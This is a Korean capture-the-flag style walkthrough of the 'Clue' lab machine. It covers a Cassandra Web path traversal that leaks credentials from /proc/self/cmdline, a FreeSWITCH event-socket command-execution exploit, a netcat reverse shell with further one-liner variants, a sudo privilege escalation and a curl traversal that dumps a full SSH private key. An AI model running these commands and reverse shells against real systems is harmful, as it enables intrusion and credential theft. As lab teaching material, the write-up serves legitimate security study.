# root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
# bin:x:2:2:bin:/bin:/usr/sbin/nologin
# ...
#
 > cassmoney.py 10.0.0.5 /proc/self/cmdline
# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
#
# (these creds are for auth to the running apache cassandra database server)
#
# Fix
# - fixed in github repo
# - v0.6.0 / ruby-gems when available
# (still recommended to containerize / run this in some sandbox, apparmor, etc)
<SNIP>
```

> [!tip] **익스플로잇을 실행하기 전에 읽어라**
> 이 자격증명 채굴 아이디어는 **저자가 주석에 적어 둔 것**이다. 익스플로잇을 블랙박스로 쓰면 `/etc/passwd` 만 읽고 끝났을 것이다.
> 30초짜리 `cat` 이 이 박스의 전체 경로를 열었다. **공개 PoC의 주석·`--help`·예시는 공짜로 주는 정찰 정보다.**

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ python 49362.py 192.168.115.240 -p 3000 /proc/self/cmdline

/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
```

![[Pasted image 20260616142532.png]]

> [!warning] 붙어 나온 문자열을 읽는 법 — **`/proc/*/cmdline` 은 NUL 로 구분된다**
> argv 원소 사이의 구분자는 공백이 아니라 **`\0`** 이다. HTTP 응답으로 나와 브라우저·터미널을 거치면서 NUL이 사라져 **전부 붙어 보인다.**
>
> ```
> /usr/bin/ruby2.5 \0 /usr/local/bin/cassandra-web \0 -u \0 cassie \0 -p \0 SecondBiteTheApple330
>  └── 인터프리터 ──┘  └────── 스크립트 ──────────┘  └ 플래그와 값 ─────────────────────┘
> ```
>
> **읽어 낸 것**: 사용자 `cassie` / 비밀번호 `SecondBiteTheApple330`
> 저자 예시는 `--username admin --password P@ssw0rd` 라는 **긴 형식**이었는데 타겟은 `-u`/`-p` **짧은 형식**을 썼다. 형태가 다르다고 없는 게 아니다 — **`-u` 뒤가 사용자, `-p` 뒤가 비밀번호**로 잘라 읽는다.
> 파이프로 처리하려면 `tr '\0' '\n'` 이 정석이다.

### 3-3. 자격증명 재사용 — SSH는 막혔고 SMB는 열렸다

`cassie` 는 `/bin/bash` 를 가졌으니 SSH를 먼저 시도했다. **거부됐다.**

![[Pasted image 20260616144300.png]]

관측된 것은 `Permission denied, please try again.` 이 반복된 것이다. 비밀번호는 맞는데 **SSH 경로로는 안 들어간다.**
[가정] `sshd_config` 의 `AllowUsers`/`DenyUsers` 또는 `PasswordAuthentication no` 로 제한된 것으로 보인다. 타겟이 정지돼 설정으로 확인하지는 못했다. (§6-④)

> [!danger] **한 서비스가 거부했다고 자격증명이 틀린 게 아니다**
> 이 박스의 핵심 분기점이다. 여기서 "비밀번호가 틀렸나 보다" 하고 `/proc/self/cmdline` 로 돌아갔다면 박스가 막혔다.
> **자격증명 하나를 얻으면 열린 포트 전부에 시도한다** — SSH · SMB · 웹 로그인 · DB · FTP · WinRM.
> 이 박스에서 SSH는 닫혀 있었고 **SMB가 열려 있었다.**

```bash
kali@kali:~/PG/Clue$ smbclient -U 'cassie%SecondBiteTheApple330' //192.168.115.240/backup
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Aug  5 17:43:50 2022
  ..                                  D        0  Fri Aug  5 17:43:44 2022
  freeswitch                          D        0  Fri Aug  5 17:43:51 2022
  cassandra                           D        0  Sat May  7 00:04:47 2022

                14343176 blocks of size 1024. 10586260 blocks available
smb: \>
```

![[Pasted image 20260616144814.png]]

> [!note] `-U 'user%password'` 문법
> `%` 뒤가 비밀번호다. 대화형 프롬프트를 건너뛴다. **작은따옴표가 필수** — 비밀번호에 `!`·`$` 가 있으면 셸이 먼저 해석해 버린다.
> 전체 내려받기는 재귀 모드로 한다:
> ```
> smb: \> prompt OFF
> smb: \> recurse ON
> smb: \> mget *
> ```
> `prompt OFF` 를 빼면 **파일마다 y/n 을 묻는다** — 245개 파일에 245번 답해야 한다. `recurse ON` 을 빼면 하위 디렉터리를 안 내려받는다.

내려받은 것은 `~/PG/Clue/freeswitch/` (245개 파일)와 `~/PG/Clue/cassandra/` 두 트리다. `/etc/freeswitch` 설정 전체와 Cassandra 3.11.13 설치본이 통째로 들어 있었다.

### 3-4. 비밀번호 사냥 — 그리고 백업의 함정

```bash
┌──(kali㉿kali)-[~/…/Clue/freeswitch/etc/freeswitch]
└─$ grep -ri 'passw'
<SNIP>
directory/default/1003.xml:      <param name="vm-password" value="1003"/>
directory/default/1008.xml:      <param name="password" value="$${default_password}"/>
directory/default/1008.xml:      <param name="vm-password" value="1008"/>

autoload_configs/event_socket.conf.xml:    <param name="password" value="ClueCon"/>

autoload_configs/hash.conf.xml: <!-- <remote name="Test1" host="10.0.0.10" port="8021" password="ClueCon" interval="1000" /> -->
autoload_configs/xml_cdr.conf.xml:         'ssl-key-path'. If your private key has a password, specify it with
<SNIP>
```

![[Pasted image 20260616161254.png]]

`ClueCon` 이 나왔다. **이것이 FreeSWITCH의 유명한 기본 비밀번호다.** 그런데 이건 백업본이다 — **live 설정을 traversal로 직접 읽어 대조했다:**

```bash
kali@kali:~/PG/Clue$ python 49362.py -p 3000 192.168.115.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml

<configuration name="event_socket.conf" description="Socket Client">
  <settings>
    <param name="nat-map" value="false"/>
    <param name="listen-ip" value="0.0.0.0"/>
    <param name="listen-port" value="8021"/>
    <param name="password" value="StrongClueConEight021"/>
  </settings>
</configuration>
```

![[Pasted image 20260616164031.png]]

> [!danger] **백업본과 live가 달랐다** — 이 박스가 가르치는 가장 실전적인 것
>
> | | SMB 백업본 | live |
> |---|---|---|
> | `password` | `ClueCon` | **`StrongClueConEight021`** |
> | `listen-ip` | `::` | `0.0.0.0` |
> | `apply-inbound-acl` | 주석 처리된 채 존재 | 줄 자체가 없음 |
>
> **백업은 과거의 스냅샷이다.** 자격증명을 백업에서 얻었으면 **가능한 한 live 원본으로 교차 확인**한다. 여기서는 마침 traversal로 같은 경로를 직접 읽을 수 있었다.
> `~/.zsh_history` 에 `grep -ri 'Strong*'` 가 남아 있다 — 나중에 진짜 비밀번호를 알고 나서 **백업본에도 있는지 되짚어 본 흔적**이다. 없었다. (§6-⑤)

### 3-5. FreeSWITCH ESL — 익스플로잇을 손으로 고친다

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ searchsploit freeswitch
┌──(kali㉿kali)-[~/PG/Clue]
└─$ searchsploit -m 47799
```

![[Pasted image 20260616164511.png]]

> [!warning] `searchsploit -m 47799` 는 **`.txt` 로 떨어진다**
> EDB 47799의 실제 파일은 `/usr/share/exploitdb/exploits/windows/remote/47799.txt` 다 — Kali에서 확인했다. 파이썬 코드인데 확장자가 `.txt` 다.
> 그래서 `~/.zsh_history` 에 `mv 47799.txt 47799.py` 가 남아 있다. **EDB의 확장자는 내용의 언어를 뜻하지 않는다.** `file` 이나 첫 줄 shebang으로 판단한다.

받은 원본은 **그대로는 실패한다.** 33번째 줄이 비밀번호를 하드코딩하고 있다. Kali의 원본과 이 박스에서 쓴 사본을 비교하면 이렇다:

| | 값 |
|---|---|
| **exploitdb 원본** (`/usr/share/exploitdb/exploits/windows/remote/47799.txt:33`) | `PASSWORD='ClueCon' # default password for FreeSWITCH` |
| **이 박스에서 쓴 사본** (`~/PG/Clue/47799.py`) | `PASSWORD='StrongClueConEight021' # default password for FreeSWITCH` |

![[Pasted image 20260616164751.png]]

> [!danger] 고친 뒤에 **주석은 거짓말로 남는다**
> 사본의 주석은 여전히 `# default password for FreeSWITCH` 다. 그런데 `StrongClueConEight021` 은 **기본값이 아니라 이 박스 고유의 값**이다.
> 몇 달 뒤 이 파일을 다시 열면 그 주석을 믿고 **"FreeSWITCH 기본 비밀번호가 StrongClueConEight021 이구나"** 하고 잘못 배운다.
> **일반화: 공개 익스플로잇을 고쳤으면 주석도 고쳐라.** 안 고칠 거면 원본을 남기고 사본에 `_edited` 를 붙여라. 이 노트는 그 오염을 막으려고 **원본 값과 수정 값을 나란히** 적어 둔다.

```bash
kali@kali:~/PG/Clue$ python 47799.py 192.168.115.240 'cat /etc/passwd'
Authenticated
Content-Type: api/response
Content-Length: 1622

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:106:113::/nonexistent:/usr/sbin/nologin
cassandra:x:107:114:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin
cassie:x:1000:1000::/home/cassie:/bin/bash
freeswitch:x:998:998:FreeSWITCH:/var/lib/freeswitch:/bin/false
anthony:x:1001:1001::/home/anthony:/bin/bash
```

`Authenticated` 와 `Content-Type: api/response` 가 **ESL이 실제로 명령을 실행했다는 증거**다. 명령 실행이 확정됐으니 셸로 간다.

### 3-6. 리버스셸

```bash
kali@kali:~/PG/Clue$ python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.45.179 3000'
Authenticated

```

> [!note] `nc -e` 가 되는 이유와, 안 될 때의 대비
> `-e` 는 **netcat-traditional 계열의 기능**이다. 타겟은 Debian 10이고 실제로 동작했다(셸이 붙었다).
> Kali 쪽도 확인해 뒀다 — `/usr/bin/nc` → `nc.traditional` 이고 `-e` 를 인식한다:
> ```
> ┌──(kali㉿kali)-[~]
> └─$ readlink -f /usr/bin/nc
> /usr/bin/nc.traditional
> ```
> [가정] 배포판에 따라 `nc` 가 openbsd 판이면 `-e` 가 없다 — 이 Kali에는 openbsd 판이 설치돼 있지 않아 직접 확인하지는 못했다.
> **`-e` 가 없을 때의 대안**: `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` · `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f` · `python3 -c 'import socket,os,pty;...'`
>
> ⚠️ 그리고 이 명령은 **틀리기 쉽다.** `~/.zsh_history` 에 목적지를 **타겟 자신의 IP**로 적은 실패가 여러 번 남아 있다 (§6-⑥).

리스너 쪽 포트가 `3000` 인 것은 **Kali의 리스닝 포트**다. 타겟의 Cassandra Web도 3000이지만 서로 다른 호스트라 충돌하지 않는다. (혼동을 부르는 선택이긴 하다.)

### 3-7. `cassie` 로 전환

셸은 FreeSWITCH 서비스 계정으로 붙는다. `/etc/passwd` 상 그 계정의 셸은 `/bin/false` 이므로 곧바로 사람 계정으로 갈아탄다:

```bash
su cassie
SecondBiteTheApple330
whoami
cassie
```

> [!warning] `su` 는 TTY를 요구한다
> 비대화형 `nc` 셸에서 `su` 를 치면 `su: must be run from a terminal` 로 거부되는 경우가 흔하다. 여기서는 통과했다.
> 막히면 먼저 TTY를 만든다: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
> **§3-3에서 SSH로는 거부된 그 비밀번호가 로컬 `su` 로는 통과한다** — 다시 한 번, 거부는 서비스별이지 자격증명의 속성이 아니다.

---

## 4. 권한상승

### 4-1. 열거 — `sudo -l`

```bash
sudo -l
Matching Defaults entries for cassie on clue:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cassie may run the following commands on clue:
    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
```

![[Pasted image 20260616171517.png]]

> [!tip] 이 출력을 읽는 법 — 세 줄 전부에 정보가 있다
>
> | 줄 | 의미 |
> |---|---|
> | `(ALL) NOPASSWD:` | **어떤 사용자로든**(`-u root` 포함), **비밀번호 없이** |
> | `/usr/local/bin/cassandra-web` | **인자 제한이 없다.** 경로만 고정이고 뒤에 뭘 붙이든 된다 → `-B 0.0.0.0:9999` 를 붙일 수 있는 이유 |
> | `secure_path=...` | sudo가 `PATH` 를 초기화한다 → **PATH 하이재킹은 불가** |
> | `env_reset` | 환경변수도 초기화 → **`LD_PRELOAD` 계열도 불가** |
>
> `env_reset` + `secure_path` 때문에 **환경 조작 계열 권한상승이 전부 막혀 있다.** 남는 것은 **그 바이너리 자체가 무엇을 하는가** 뿐이다 — §2-7의 사고로 넘어간다.
>
> 참고로 `cassandra-web` 은 **GTFOBins에 없다.** 목록에 없다고 끝이 아니다.

### 4-2. root 권한 인스턴스 기동

```bash
sudo -u root /usr/local/bin/cassandra-web -B 0.0.0.0:9999 -u cassie -p SecondBiteTheApple330
```

| 인자 | 역할 | 뺐다면 |
|---|---|---|
| `sudo -u root` | **root로 실행** ← 이게 전부다 | cassie 권한 인스턴스가 하나 더 생길 뿐, 아무 의미 없다 |
| `-B 0.0.0.0:9999` | 바인드 주소·포트 | 기본 3000은 **이미 점유돼 있다.** 안 바꾸면 bind 실패 |
| `-u cassie -p SecondBiteTheApple330` | 백엔드 Cassandra DB 접속 정보 | 앱이 DB에 못 붙어 기동에 실패할 수 있다. **§3-2에서 훔친 그 값을 그대로 재사용**한다 |

> [!danger] 이 명령 자체가 **자격증명을 다시 노출한다**
> `-p SecondBiteTheApple330` 이 argv에 들어가므로 이 프로세스의 `/proc/<pid>/cmdline` 에도 평문으로 박힌다. §2-3의 결함을 내가 다시 만드는 셈이다.
> 랩에서는 상관없지만, **실전 침투에서는 이 한 줄이 프로세스 목록에 남는다**는 것을 알고 써야 한다.

기동을 확인한다:

```bash
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9042          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8021            0.0.0.0:*               LISTEN      544/freeswitch
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:43711         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:7199          0.0.0.0:*               LISTEN      -
udp        0      0 192.168.239.240:123     0.0.0.0:*                           -
udp        0      0 127.0.0.1:123           0.0.0.0:*                           -
udp        0      0 0.0.0.0:123             0.0.0.0:*                           -
```

> [!tip] 내부에서 본 포트 표가 외부 nmap보다 넓다 — **여기서도 정찰이다**
> nmap이 밖에서 본 것은 6개(22·80·139·445·3000·8021)였다. 안에서 보니 **더 있다:**
>
> | 포트 | 정체 | 왜 밖에서 안 보였나 |
> |---|---|---|
> | `127.0.0.1:9042` | **Cassandra CQL 네이티브** | 루프백 바인드 |
> | `127.0.0.1:7199` | **Cassandra JMX** | 루프백 바인드. JMX는 흔히 RCE 경로다 |
> | `127.0.0.1:43711` | JMX/RMI 임의 포트 [가정] | 루프백 바인드 |
> | `0.0.0.0:1337` | **외부 바인드인데 nmap에 없다** | **방화벽에 막혔다** (`Not shown: 65529 filtered`) |
> | `0.0.0.0:9999` | 방금 내가 띄운 root 인스턴스 | — |
>
> **`0.0.0.0:1337` 이 필터링된 것**은 §1-2의 `filtered ... (no-response)` 판정과 정확히 들어맞는다. 밖에서 안 보이는 서비스가 실재한다는 실물 증거다.
> 셸을 잡으면 `netstat -tulpn`(또는 `ss -tulpn`)을 반드시 친다. 루프백 서비스는 **포트포워딩으로 꺼내 쓴다.**

```bash
curl 0.0.0.0:9999
<!DOCTYPE html>
<html lang="en" ng-app="cassandra">
  <head>
    <base href="/">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cassandra Web</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/css/bootstrap.css">
    <link rel="stylesheet" href="/css/bootstrap-theme.css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- CodeMirror -->
    <link rel="stylesheet" href="/css/codemirror.css">
    <link rel="stylesheet" href="/css/codemirror-solarized.css">
    <!-- Prism -->
    <link rel="stylesheet" href="/css/prism.css">
```

응답이 온다. **root 권한 Cassandra Web이 9999에서 살아 있다.**

### 4-3. 같은 traversal, 이번엔 root 권한으로 — **수동 `curl`**

익스플로잇 스크립트를 다시 쓸 필요가 없다. §2-1에서 원리를 알았으니 `curl` 한 줄이면 된다.

```bash
curl --path-as-is http://0.0.0.0:9999/../../../../../../../../../home/anthony/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAw59iC+ySJ9F/xWp8QVkvBva2nCFikZ0VT7hkhtAxujRRqKjhLKJe
d19FBjwkeSg+PevKIzrBVr0JQuEPJ1C9NCxRsp91xECMK3hGh/DBdfh1FrQACtS4oOdzdM
jWyB00P1JPdEM4ojwzPu0CcduuV0kVJDndtsDqAcLJr+Ls8zYo376zCyJuCCBonPVitr2m
B6KWILv/ajKwbgrNMZpQb8prHL3lRIVabjaSv0bITx1KMeyaya+K+Dz84Vu8uHNFJO0rhq
gBAGtUgBJNJWa9EZtwws9PtsLIOzyZYrQTOTq4+q/FFpAKfbsNdqUe445FkvPmryyx7If/
DaMoSYSPhwAAA8gc9JxpHPScaQAAAAdzc2gtcnNhAAABAQDDn2IL7JIn0X/FanxBWS8G9r
acIWKRnRVPuGSG0DG6NFGoqOEsol53X0UGPCR5KD4968ojOsFWvQlC4Q8nUL00LFGyn3XE
QIwreEaH8MF1+HUWtAAK1Lig53N0yNbIHTQ/Uk90QziiPDM+7QJx265XSRUkOd22wOoBws
mv4uzzNijfvrMLIm4IIGic9WK2vaYHopYgu/9qMrBuCs0xmlBvymscveVEhVpuNpK/RshP
HUox7JrJr4r4PPzhW7y4c0Uk7SuGqAEAa1SAEk0lZr0Rm3DCz0+2wsg7PJlitBM5Orj6r8
UWkAp9uw12pR7jjkWS8+avLLHsh/8NoyhJhI+HAAAAAwEAAQAAAQBjswJsY1il9I7zFW9Y
etSN7wVok1dCMVXgOHD7iHYfmXSYyeFhNyuAGUz7fYF1Qj5enqJ5zAMnataigEOR3QNg6M
mGiOCjceY+bWE8/UYMEuHR/VEcNAgY8X0VYxqcCM5NC201KuFdReM0SeT6FGVJVRTyTo+i
CbX5ycWy36u109ncxnDrxJvvb7xROxQ/dCrusF2uVuejUtI4uX1eeqZy3Rb3GPVI4Ttq0+
0hu6jNH4YCYU3SGdwTDz/UJIh9/10OJYsuKcDPBlYwT7mw2QmES3IACPpW8KZAigSLM4fG
Y2Ej3uwX8g6pku6P6ecgwmE2jYPP4c/TMU7TLuSAT9TpAAAAgG46HP7WIX+Hjdjuxa2/2C
gX/VSpkzFcdARj51oG4bgXW33pkoXWHvt/iIz8ahHqZB4dniCjHVzjm2hiXwbUvvnKMrCG
krIAfZcUP7Ng/pb1wmqz14lNwuhj9WUhoVJFgYk14knZhC2v2dPdZ8BZ3dqBnfQl0IfR9b
yyQzy+CLBRAAAAgQD7g2V+1vlb8MEyIhQJsSxPGA8Ge05HJDKmaiwC2o+L3Er1dlktm/Ys
kBW5hWiVwWoeCUAmUcNgFHMFs5nIZnWBwUhgukrdGu3xXpipp9uyeYuuE0/jGob5SFHXvU
DEaXqE8Q9K14vb9by1RZaxWEMK6byndDNswtz9AeEwnCG0OwAAAIEAxxy/IMPfT3PUoknN
Q2N8D2WlFEYh0avw/VlqUiGTJE8K6lbzu6M0nxv+OI0i1BVR1zrd28BYphDOsAy6kZNBTU
iw4liAQFFhimnpld+7/8EBW1Oti8ZH5Mx8RdsxYtzBlC2uDyblKrG030Nk0EHNpcG6kRVj
4oGMJpv1aeQnWSUAAAAMYW50aG9ueUBjbHVlAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

> [!danger] `--path-as-is` 를 빼면 **traversal이 서버에 도달조차 못 한다**
> curl은 기본적으로 **요청을 보내기 전에 클라이언트 쪽에서 `../` 를 정규화한다.** 서버가 아니라 **curl이** 경로를 접어 버린다.
> Kali에서 로컬 리스너를 세워 **실제로 나간 요청 줄**을 잡아 확인했다:
>
> ```
> ┌──(kali㉿kali)-[/tmp]
> └─$ curl -s -o /dev/null "http://127.0.0.1:18099/../../../../../../../../../home/anthony/.ssh/id_rsa"
> REQUEST LINE: GET /home/anthony/.ssh/id_rsa HTTP/1.1
>
> ┌──(kali㉿kali)-[/tmp]
> └─$ curl -s -o /dev/null --path-as-is "http://127.0.0.1:18099/../../../../../../../../../home/anthony/.ssh/id_rsa"
> REQUEST LINE: GET /../../../../../../../../../home/anthony/.ssh/id_rsa HTTP/1.1
> ```
>
> **`../` 아홉 개가 통째로 사라진다.** 그러면 서버는 `/home/anthony/...` 라는 존재하지 않는 정적 파일을 찾다가 index를 돌려주고, 결과를 보고 **"traversal이 막혔나 보다"** 로 오판하게 된다.
> **traversal을 손으로 칠 때 `--path-as-is` 는 선택이 아니다.** 같은 이유로 브라우저 주소창도 못 쓴다 — 브라우저도 정규화한다. Burp Repeater나 `--path-as-is` 를 쓴다.
> 이건 이 노트가 제공하는 **자동 도구의 수동 대안**이기도 하다 — `49362.py` 없이 같은 결과를 얻는 방법이다.

### 4-4. 키로 로그인 — 주석을 믿지 마라

```bash
┌──(kali㉿kali)-[~/PG/Clue]
└─$ ssh -i ./id_rsa root@192.168.239.240
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux clue 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Apr 29 17:57:54 2024
root@clue:~#
```

원본 노트에 남은 한 줄이 이 박스의 정수다 — *"anthony 계정은 안되고 root만 됨..?"*

> [!danger] **키 파일의 주석은 소유자가 아니다**
> 키를 검사해 보면 주석이 `anthony@clue` 라고 적혀 있다:
>
> ```
> ┌──(kali㉿kali)-[~/PG/Clue]
> └─$ ssh-keygen -l -f id_rsa
> 2048 SHA256:PN6pyaVqalSAe2eLdTcog5/dsxHYnOaaDsqKw/vYRPs anthony@clue (RSA)
> ```
>
> 그런데 로그인되는 계정은 **root** 다. 모순이 아니다:
> - **주석**은 키를 **만든 사람이 자기 컴퓨터에서 붙인 라벨**이다. `ssh-keygen` 이 기본으로 `user@host` 를 넣을 뿐, 서버는 이 문자열을 **인증에 전혀 쓰지 않는다.**
> - **인증을 결정하는 것은 오직** `<대상계정의 홈>/.ssh/authorized_keys` 에 **이 키의 공개키가 들어 있는가** 다.
> - 이 박스에서는 **root의 `authorized_keys` 에 anthony의 공개키가 등록돼 있었다.** 관리자가 편의로 자기 키를 root에 넣어 둔, 현실에서 매우 흔한 패턴이다.
>
> **반사신경: 개인키를 주우면 사용자 이름을 전부 돌린다.**
> ```bash
> for u in root anthony cassie admin ubuntu debian; do
>   ssh -i id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no $u@TARGET id 2>/dev/null && echo "  ^^^ $u WORKS"
> done
> ```
> `-o BatchMode=yes` 가 중요하다 — 키가 거부될 때 **비밀번호를 묻지 않고 즉시 실패**해서 루프가 멈추지 않는다.
> §6-⑧에 이걸 몰라서 태운 시간이 기록돼 있다.

---

## 5. 플래그

```bash
root@clue:~# cat proof.txt
The proof is in another file
root@clue:~# ls
proof.txt  proof_youtriedharder.txt  smbd.sh
root@clue:~# cat proof_youtriedharder.txt
1a6357e9c8ef5c6611ff47866ad97541
```

![[Pasted image 20260622131520.png]]

```bash
root@clue:~# ls -al /var/lib/freeswitch
total 32
drwxr-xr-x  6 freeswitch freeswitch 4096 Aug 11  2022 .
drwxr-xr-x 33 root       root       4096 Aug  5  2022 ..
-rw-------  1 freeswitch freeswitch   25 Aug 13  2022 .bash_history
drwxrwx---  2 freeswitch freeswitch 4096 Aug  3  2024 db
drwxr-xr-x  2 freeswitch freeswitch 4096 Aug  5  2022 images
-rw-------  1 freeswitch freeswitch   33 Jun 21 19:56 local.txt
drwxrwx---  2 freeswitch freeswitch 4096 Aug  5  2022 recordings
drwxrwx---  2 freeswitch freeswitch 4096 Aug  5  2022 storage
root@clue:~# cat /var/lib/freeswitch/local.txt
22288e4fbb81033971802e537c05bdc2
```

| 플래그 | 위치 | 값 |
|---|---|---|
| `local.txt` | **`/var/lib/freeswitch/local.txt`** | `22288e4fbb81033971802e537c05bdc2` |
| proof | **`/root/proof_youtriedharder.txt`** | `1a6357e9c8ef5c6611ff47866ad97541` |

> [!danger] **표준 위치가 아니다 — 두 플래그 다**
> - **`/root/proof.txt` 는 미끼다.** 내용이 `The proof is in another file` 이다. 이걸 그대로 제출하면 오답이다. **`ls` 를 쳐서 옆의 `proof_youtriedharder.txt` 를 찾아야 한다.**
> - **`local.txt` 가 사용자 홈에 없다.** `/home/cassie` 도 `/home/anthony` 도 아니고 **FreeSWITCH 서비스 계정의 홈** `/var/lib/freeswitch/` 에 있다. `/etc/passwd` 의 `freeswitch:...:/var/lib/freeswitch:/bin/false` 줄이 그 위치를 미리 알려주고 있었다(§3-1).
>
> **일반화: 플래그가 안 보이면 `/home/*` 만 뒤지지 말고 서비스 계정의 홈을 본다.** `/etc/passwd` 의 여섯 번째 필드가 후보 목록이다.
> 전수 검색: `find / \( -name "local.txt" -o -name "proof*.txt" \) 2>/dev/null`
>
> ⚠️ 두 플래그 모두 **대화형 SSH 셸에서 `cat`** 으로 읽었다. OSCP는 웹셸 취득을 0점 처리한다 — 이 박스는 요건을 만족한다. 다만 증거 스크린샷에 `ip a` 를 함께 담는 습관은 들이자. [[Butch]] 참조.

`smbd.sh` 가 `/root` 에 함께 있는 것도 눈에 띈다 — [가정] 랩 구성용 스크립트로 보이며 내용은 확인하지 않았다.

---

## 6. 막혔던 지점 / 시행착오

> [!abstract] 이 장의 출처
> 아래는 대부분 **Kali `~/.zsh_history` 에서 회수한 실제 명령**이다. 원본 노트에는 성공 경로만 있었다.
> 도구 동작(②·③·⑦·⑩)은 **Kali에서 직접 실행해 확인**했다. `~/.zsh_history` 에는 타임스탬프가 없고 여러 tmux 창의 기록이 섞여 있으므로, **순서는 산출물 mtime을 우선**하고 애매한 곳은 그렇게 밝힌다.

### ① CVE-2021-44142 — README 예시를 그대로 복사했다 (10:27 → 10:31, **4분**)

```
git clone https://github.com/horizon3ai/CVE-2021-44142.git
cd CVE-2021-44142
...
python check_vulnerable.py 192.168.115.240 445 TimeMachineBackup Guest
```

**PoC README의 예시와 나란히 놓으면 바로 보인다** (디스크의 `README.md` 원문):

```
## Example
python check_vulnerable.py 192.168.1.183 445 TimeMachineBackup Guest
```

**IP만 바꾸고 나머지는 그대로다.** `TimeMachineBackup` 은 저자의 시험 장비(Western Digital PR4100)에 있던 공유 이름이지 **이 박스의 공유가 아니다.** 이 박스의 공유는 `backup` 이다 — §3-3에서 확인된다.

> [!danger] 왜 이 시도가 처음부터 성립할 수 없었나
> §2-6의 표를 다시 보면 **버전만 맞고 나머지가 전부 틀렸다.** 특히:
> - **공유 이름이 존재하지 않는다** → tree connect 단계에서 실패
> - `vfs_fruit` 로드 여부·`fruit:metadata` 값을 확인하지 않았다 → **설정 게이트 미확인**
>
> **손절 자체는 훌륭했다 — 4분.** `__pycache__` mtime(10:31)이 clone(10:27) 뒤 4분이고 그 뒤로 아무 일도 없다.
> 문제는 **왜 실패했는지 정리하지 않고 넘어간 것**이다. 원본 노트에는 이 시도가 **한 줄도 없었다.** 산출물 디렉터리만 유령처럼 남아 있었다.
>
